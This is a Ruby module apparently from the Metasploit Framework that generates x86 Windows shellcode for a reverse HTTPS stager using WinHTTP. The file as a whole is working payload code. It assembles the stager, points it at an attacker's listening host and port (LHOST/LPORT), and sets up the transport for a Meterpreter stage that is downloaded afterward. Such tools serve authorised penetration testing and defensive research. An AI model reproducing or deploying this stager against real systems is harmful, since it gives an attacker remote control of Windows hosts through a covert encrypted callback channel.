# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/reverse_winhttp'
require 'msf/core/payload/windows/verify_ssl'
require 'rex/payloads/meterpreter/uri_checksum'

module Msf


###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTPS using WinHTTP
#
###


module Payload::Windows::ReverseWinHttps

  include Msf::Payload::Windows::ReverseWinHttp
  include Msf::Payload::Windows::VerifySsl

  #
  # Register reverse_winhttps specific options
  #
  def initialize(*args)
    super
    register_advanced_options(
      [
        OptBool.new('StagerVerifySSLCert', [false, 'Whether to verify the SSL certificate hash in the handler', false])
      ], self.class)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_winhttps(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_winhttp(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Generate the first stage
  #
  def generate

    verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
                                         datastore['HandlerSSLCert'])

    # Generate the simple version of this stager if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space

      if verify_cert_hash
        raise ArgumentError, "StagerVerifySSLCert is enabled but not enough payload space is available"
      end

      return generate_reverse_winhttps(
        ssl:  true,
        host: datastore['LHOST'],
        port: datastore['LPORT'],
        url:  generate_small_uri,
        verify_cert_hash: verify_cert_hash,
        retry_count: datastore['StagerRetryCount'])
    end

    conf = {
      ssl:  true,
      host: datastore['LHOST'],
      port: datastore['LPORT'],
      url:  generate_uri,
      exitfunk: datastore['EXITFUNC'],
      verify_cert_hash: verify_cert_hash,
      retry_count: datastore['StagerRetryCount']
    }

    generate_reverse_winhttps(conf)
  end

  def generate_transport_config(opts={})
    # most cases we'll haev a URI already, but in case we don't
    # we should ask for a connect to happen given that this is
    # going up as part of the stage.
    uri = opts[:uri]
    unless uri
      sum = uri_checksum_lookup(:connect)
      uri = generate_uri_uuid(sum, opts[:uuid])
    end

    {
      :scheme       => 'https',
      :lhost        => datastore['LHOST'],
      :lport        => datastore['LPORT'].to_i,
      :uri          => uri,
      :comm_timeout => datastore['SessionCommunicationTimeout'].to_i,
      :retry_total  => datastore['SessionRetryTotal'].to_i,
      :retry_wait   => datastore['SessionRetryWait'].to_i
    }
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    space = super

    # SSL support adds 20 bytes
    space += 20

    # SSL verification adds 120 bytes
    if datastore['StagerVerifySSLCert']
      space += 120
    end

    space
  end

end

end

